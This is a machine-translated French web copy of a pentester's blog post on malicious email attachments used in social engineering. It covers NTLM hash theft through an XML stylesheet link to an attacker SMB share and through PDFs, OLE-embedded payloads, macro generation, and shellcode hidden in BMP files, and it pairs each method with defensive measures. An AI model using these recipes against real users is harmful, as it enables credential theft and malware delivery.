<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üö® ‚ôèÔ∏è üëÜüèª L'ouverture ne peut pas √™tre ignor√©e üë¶üèø üì¢ üßëüèø‚Äçü§ù‚Äçüßëüèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Mon travail est li√© au fait que je mens aux gens et que j'exploite leur cr√©dulit√©, leur curiosit√©, leur cupidit√©, etc. J'adore mon travail et j'essaie...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>L'ouverture ne peut pas √™tre ignor√©e</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/jetinfosystems/blog/426463/"><img src="https://habrastorage.org/webt/j-/hv/q2/j-hvq2d89iomeavboeblim7pi9y.jpeg"><br><br>  Mon travail est li√© au fait que je mens aux gens et que j'exploite leur cr√©dulit√©, leur curiosit√©, leur cupidit√©, etc.  J'adore mon travail et j'essaie de l'aborder de fa√ßon cr√©ative.  Les sp√©cificit√©s de mon activit√© sont li√©es √† la conduite d'attaques par la m√©thode de l'ing√©nierie sociale.  Et dans ce post, je voudrais parler des pi√®ces jointes malveillantes. <br><a name="habracut"></a><br>  Si le PDF tombe dans votre courrier, allez-vous l'ouvrir?  Et le fichier Word?  Allez-vous ouvrir l'image √† partir d'une source inconnue?  Est-il possible de rencontrer des probl√®mes si vous t√©l√©chargez l'archive?  Dans quelle mesure savez-vous quels investissements sont dangereux et lesquels ne le sont pas?  Et vos coll√®gues? <br><br>  Pour plusieurs dizaines de projets, j'ai essay√© des fa√ßons compl√®tement diff√©rentes de fournir la charge utile √† l'utilisateur.  Certains ont √©t√© tr√®s efficaces, certains ont √©t√© facilement d√©tect√©s - chacun a ses propres inconv√©nients et avantages.  Je ne vous dirai pas comment emballer les fichiers ex√©cutables avec l'extension .exe dans l'archive.  Avec une telle approche √† l'ancienne, percer les syst√®mes de s√©curit√©, puis obliger l'utilisateur √† d√©marrer la pi√®ce jointe, est plus cher.  Je vais vous dire quels fichiers potentiellement dangereux peuvent √™tre re√ßus par la poste (ou envoy√©s) aujourd'hui. <br><br>  Avis de non-responsabilit√©: Tout ce qui suit est √† titre informatif uniquement.  L'auteur d√©crit l'exp√©rience acquise lors des pentests, n'est pas responsable de la r√©p√©tition de ces attaques et encourage √† ne pas utiliser le mat√©riel √† des fins ill√©gales. <br><br><h2>  XML </h2><br>  <b>L'essence de la m√©thode</b> <br><br>  La plupart des fichiers Office sont bas√©s sur Microsoft Office Open XML (OOXML), qui est essentiellement un format XML compress√© d√©velopp√© par Microsoft pour pr√©senter des tableaux, des graphiques, des pr√©sentations, etc.  L'implication XML est affich√©e dans l'extension du document (docx, xlsx, pptx).  Il est tr√®s curieux que ces documents Office puissent √™tre ouverts en tant que fichier texte normal avec toutes les balises et les attributs.  Tout fichier Office Open XML peut √™tre enregistr√© au format XML et apporter des modifications aux balises.  Par exemple, ajoutez un lien vers un dossier public contr√¥l√© par un attaquant.  Lorsque vous ex√©cutez le fichier XML, il essaie de se connecter √† un dossier public ouvert.  Lorsque vous essayez de vous connecter via le protocole smb, Windows fournit gentiment un hachage NTLM (NTLMv2) et une connexion utilisateur √† un attaquant. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/08c/d1a/28f/08cd1a28f9c6ee5699c995d8cf3377e2.png"><br><br>  <b>La mise en ≈ìuvre en bref</b> <br><br>  Pour impl√©menter le vecteur, vous devez cr√©er un document Office Open XML (docx, pptx, xlsx, etc.), l'enregistrer au format XML.  Ouvrez XML et apportez les modifications suivantes: <br><br> <code>&lt;?xml-stylesheet type="text/xsl" href="\\xxx.xxx.xxx.xxx <u>\test\swordfish.xsl</u> "&gt;</code> <br> <br>  Dans la balise sp√©cifi√©e, vous devez sp√©cifier l'adresse du dossier de r√©seau public auquel la victime se connectera. <br><br>  <b>Remarque</b> : au lieu de <code>="\\xxx.xxx.xxx.xxx\test\swordfish.xsl</code> vous pouvez √©crire le <code>file:/// xxx.xxx.xxx.xxx/test/swordfish.xsl</code> . Ensuite, le fichier doit √™tre enregistr√© et envoy√© √† la victime. <br><br>  Des informations sur l'attaque sont disponibles <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . <br><br>  <b>Remarque</b> : selon le syst√®me d'exploitation et les param√®tres, l'utilisateur peut √™tre amen√© √† accepter des conditions ou des commentaires suppl√©mentaires, par exemple: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/0e3/175/b41/0e3175b41c0ef9cb1e79c19295710e94.png"><br><br>  Un article serait incomplet sans conseil de protection: <br><br><ul><li>  Utilisez une politique de mot de passe complexe. </li><li>  Utilisez NTLMv2. </li><li>  Refuser le trafic externe via smb (TCP 139/445). </li></ul><br><h2>  Mauvais pdf </h2><br>  <b>L'essence de la m√©thode</b> <br><br>  Une balise est ajout√©e au fichier PDF avec un lien vers un serveur public smb contr√¥l√© par l'attaquant.  Comme dans l'exemple ci-dessus, lors de l'ouverture d'un fichier, le syst√®me d'exploitation transmet un hachage NTLM (NTLMv2) pour se connecter au dossier public. <br><br>  <b>La mise en ≈ìuvre en bref</b> <br><br>  La mise en ≈ìuvre de cette attaque est beaucoup plus facile que la pr√©c√©dente.  Pour r√©ussir √† voler un hachage, t√©l√©chargez simplement l'utilitaire (git clone <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> ou <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> ) et donnez le droit d'ex√©cuter (chmod + x) le fichier python.  Ensuite, ex√©cutez le script python et entrez l'adresse IP, le nom de fichier et l'interface, comme dans la figure ci-dessous. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/318/d7c/e30/318d7ce30c76b661055d975b8875b597.png"><br>  <i>G√©n√©ration d'un fichier de charge utile.</i> <br><br>  Le dossier re√ßu peut √™tre envoy√© par la poste sous couvert de f√©licitations, d'un document √† signer, d'un scan de la candidature, etc.  Lorsque le fichier d√©marre, tous les hachages seront envoy√©s √† l'attaquant. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/198/0d6/dd2/1980d6dd2efd24b39c393c31f4b36611.png"><br><br>  <b>La protection</b> <br><br><ul><li>  Utilisez une politique de mot de passe complexe. </li><li>  Utilisez NTLMv2. </li><li>  Refuser le trafic externe via smb (TCP 139/445). </li></ul><br><h2>  Objet OLE </h2><br>  <b>L'essence de la m√©thode</b> <br><br>  Dans un document Office l√©gitime, un script lanc√© en cliquant est incorpor√©.  Le script peut √™tre absolument n'importe lequel, c'est g√©n√©ralement juste une charge utile.  Il a sa propre ic√¥ne, qui peut √™tre modifi√©e, selon les d√©sirs de l'attaquant, jusqu'√† une copie compl√®te du style des documents Office qui simulent les messages d'erreur.  Contrairement aux macros, un fichier avec une pi√®ce jointe OLE n'est pas suspect pour les utilisateurs ordinaires. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/b16/113/233/b161132334ba58421370c143a9942677.png" width="400"></div><br>  <b>La mise en ≈ìuvre en bref</b> <br><br>  Pour se pr√©parer √† cette attaque, il faudra d√©penser un peu plus d'efforts (par rapport √† ceux ci-dessus).  La premi√®re √©tape consiste √† g√©n√©rer une charge utile.  Ensuite, vous devez d√©marrer le serveur, qui recevra les connexions de la charge utile, puis cr√©er un document Word, le convertir en RTF et ajouter un lien vers la charge utile.  Si bri√®vement. <br>  Des informations sur l'attaque sont disponibles <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . <br><br>  <b>La protection</b> <br><br>  Pour vous prot√©ger contre de telles attaques, nous vous <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">recommandons d'</a> effectuer les modifications de registre suivantes: <br><br> <code>HKCUSoftwareMicrosoftOffice -&gt; Office Version -&gt; Office application -&gt; SecurityPackagerPrompt</code> <br> <br>  La valeur de la <code>Office Version</code> peut √™tre 16,0 (Office 2016);  15,0 (Office 2013);  14,0 (Office 2010);  ou 12.0 (Office 2007).  La valeur de l' <code>Office application</code> est le nom d'une application Office sp√©cifique, c'est-√†-dire Word, Excel, etc. <br><br>  La valeur de cette cl√© de registre doit √™tre "2", ce qui signifie "Aucune invite, l'objet ne s'ex√©cute pas" ou une interdiction r√©elle de l'ex√©cution des objets.  Une valeur de "1" permet √† l'utilisateur de "Demander √† partir d'Office lorsque l'utilisateur clique, l'objet s'ex√©cute", c'est-√†-dire que les objets sont cliqu√©s et qu'Office affiche le message correspondant.  La valeur ¬´0¬ª, √† son tour, signifie ¬´Aucune invite d'Office lorsque l'utilisateur clique, l'objet s'ex√©cute¬ª, en d'autres termes, les objets sont ex√©cut√©s, mais l'utilisateur ne re√ßoit aucun message d'Office. <br><br>  Des modifications peuvent √™tre apport√©es si ces fonctions ne sont pas utilis√©es dans les processus commerciaux de votre entreprise. <br><br><h2>  Macros </h2><br>  Depuis OLE a √©t√© mentionn√©, comment puis-je ne pas mentionner les macros? <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ae7/b0b/9f7/ae7b0b9f78363bd943682230cc391fb8.png"><br><br>  <b>L'essence de la m√©thode</b> <br><br>  Macro - un ensemble de commandes con√ßues pour simplifier le travail de l'utilisateur.  Potentiellement, vous pouvez √©crire absolument n'importe quel ensemble de commandes dans une macro et ainsi obtenir une charge utile.  Pour cr√©er un document avec une macro, un attaquant doit simplement masquer le code de charge utile et ajouter le code √† la macro de document. <br><br>  <b>La mise en ≈ìuvre en bref</b> <br><br>  Il existe actuellement de nombreuses fa√ßons de g√©n√©rer une macro.  Vous pouvez utiliser l'outil <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Luckystrike</a> ou vous arr√™ter au <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Metasploit</a> plus familier.  Vous pouvez utiliser msfvenom et masquer la macro apr√®s la g√©n√©ration.  Une fois la macro cr√©√©e, il vous suffit de l'ajouter au document Office.  Mais contrairement √† une pi√®ce jointe OLE, vous avez vraiment besoin de beaucoup d'efforts pour ex√©cuter une macro.  Pour le moment, tr√®s peu d'utilisateurs ex√©cuteront des macros.  Windows a d√©j√† appris √† mettre en garde contre les macros suspectes, et on a beaucoup parl√© de leur danger. <br><br>  <b>La protection</b> <br><br>  Pour plus de fiabilit√©, je recommande de d√©sactiver l'ex√©cution des macros sans notification. <br><br><h2>  BMP </h2><br>  Il est tr√®s peu probable que vous rencontriez un attachement BMP avec un shellcode, alors soyez conscient: il y en a. <br><br>  <b>L'essence de la m√©thode</b> <br><br>  Le code shell est int√©gr√© dans l'image au format BMP.  L'image elle-m√™me n'est pas dangereuse au moment de la d√©couverte.  Il ne s'agit pas de laisser un attaquant prendre une session.  L'image est n√©cessaire pour mentir et attendre l'heure o√π l'attaquant l'activera √† l'aide de la commande Powershell.  Cette m√©thode n'est pas tant une attaque qu'un contournement d'antivirus et d'outils de d√©tection d'intrusion. <br><br>  <b>La mise en ≈ìuvre en bref</b> <br><br>  Pour cr√©er une image, utilisez simplement ce <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">r√©f√©rentiel</a> .  DKMC fournit tout, de la g√©n√©ration d'images √† l'obscurcissement de code.  Je veux √©galement noter que l'image "infect√©e" contiendra d'√©tranges pixels multicolores.  Cela peut √™tre facilement r√©solu si vous recadrez la zone visible de l'image de 5 √† 10 pixels. <br><br>  Apr√®s avoir cr√©√© l'image, le fichier doit √™tre remis √† la victime et attendre la bonne occasion ou chercher l'opportunit√© d'ex√©cuter le script powershell. <br><br>  <b>La protection</b> <br><br>  Filtrer chaque fichier bmp comme potentiellement dangereux est inefficace.  Vous pouvez utiliser des convertisseurs et enregistrer des images dans d'autres formats, inspecter des fichiers sur des ordinateurs ou accepter le fait que si un attaquant a r√©ussi √† utiliser le script PowerShell sur l'ordinateur d'un employ√©, la pr√©sence d'une image avec le code shell n'est pas le principal probl√®me de s√©curit√©. <br><br>  En fait, c'est tout.  J'esp√®re que cet article a √©largi votre compr√©hension des investissements et des dangers qu'ils peuvent comporter.  Nous parlerons des liens suspects un peu plus tard. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/95a/62c/c68/95a62cc68d2af00c3b53b649faf4638b.png"><br><br>  <i>Ekaterina Rudaya ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" class="user_link">Caterin</a> ), experte au laboratoire d'analyse pratique de la s√©curit√©, Jet Infosystems</i> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr426463/">https://habr.com/ru/post/fr426463/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr426449/index.html">iPhone XS: pourquoi c'est un tout nouvel appareil photo</a></li>
<li><a href="../fr426451/index.html">Adieu √† Baxter, le g√©ant le plus doux des robots</a></li>
<li><a href="../fr426457/index.html">Les utilisateurs de Google ont franchi le cap des 25% du nombre de connexions IPv6</a></li>
<li><a href="../fr426459/index.html">Habrokvest en l'honneur du 20e anniversaire du groupe Mail.Ru - 20 t√¢ches</a></li>
<li><a href="../fr426461/index.html">Trouver un garage: TESLA sans course</a></li>
<li><a href="../fr426465/index.html">¬´Nous changeons le terrain¬ª - L'informatique va sur un grand chantier</a></li>
<li><a href="../fr426469/index.html">Le t√©l√©gramme comme standard d'entreprise</a></li>
<li><a href="../fr426471/index.html">Comment les donn√©es des logiciels espions fuient</a></li>
<li><a href="../fr426473/index.html">Architecture Redux. Oui ou non?</a></li>
<li><a href="../fr426475/index.html">Miya - assistant depuis le smartphone</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>